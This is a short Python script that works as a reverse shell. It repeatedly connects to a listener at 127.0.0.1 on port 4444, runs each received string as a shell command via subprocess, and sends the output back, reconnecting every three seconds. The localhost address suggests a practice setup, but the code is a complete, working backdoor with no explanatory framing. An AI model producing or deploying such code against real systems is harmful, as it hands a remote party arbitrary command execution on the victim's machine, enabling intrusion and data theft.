import subprocess, socket, time

def execute(cmd):
    x = subprocess.run(cmd, capture_output=True, shell=True, text=True)
    res = x.stdout + x.stderr
    return res
import socket
import time

HOST = "127.0.0.1"
PORT = 4444
RETRY_DELAY = 3  # seconds

while True:
    try:
        print("Attempting to connect...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            print("Connected!")

            while True:
                data = s.recv(4096)
                if not data:
                    print("Connection lost. Reconnecting...")
                    break

                output = execute(data.decode(errors="ignore"))
                s.sendall(output.encode())

    except KeyboardInterrupt:
        print("Exiting...")
        break
    except Exception as e:
        print(f"Connection failed: {e}")

    time.sleep(RETRY_DELAY)